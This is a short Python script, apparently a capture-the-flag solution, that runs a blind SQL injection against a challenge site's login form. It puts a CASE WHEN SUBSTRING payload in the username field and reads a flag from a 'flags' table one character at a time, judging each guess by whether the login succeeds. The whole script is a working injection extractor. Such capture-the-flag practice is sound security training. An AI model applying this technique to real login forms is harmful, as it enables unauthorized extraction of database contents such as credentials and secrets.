#!/usr/bin/env python3
import requests
import time
import string

url = 'https://153plus1-bat-blind.chals.io/login'
i=14
flag = 'flag{but_you_'
while True:
	for char in string.printable:
		if char=="'":
			continue
		payload = f"""' OR (SELECT CASE WHEN (SUBSTRING(flag,{i},1) = '{char}') THEN (1=1) ELSE 'a' END FROM flags) -- '"""

		data = {
			'username': payload,
			'password': 'randompass'
		}
		r = requests.post(url,data=data)
		print(char, r.status_code)
		if 'Congrats, you logged in!' in r.text:
			flag+=char
			print('current flag: '+flag)
			i+=1